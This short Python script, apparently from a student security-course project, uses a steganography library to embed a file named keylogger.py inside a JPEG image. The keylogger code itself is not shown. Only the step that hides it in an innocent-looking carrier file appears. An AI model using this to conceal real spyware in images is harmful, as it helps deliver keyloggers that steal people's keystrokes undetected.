# Import library
from steg import steg_img

# Hiding
# Select your payload and carrier files
s = steg_img.IMG(payload_path="D:/Projekt/LiU/TNM031/TNM031-Keylogger/keylogger.py", image_path="D:/Projekt/LiU/TNM031/TNM031-Keylogger/new.jpeg")
# Create a new image containing your payload
s.hide()
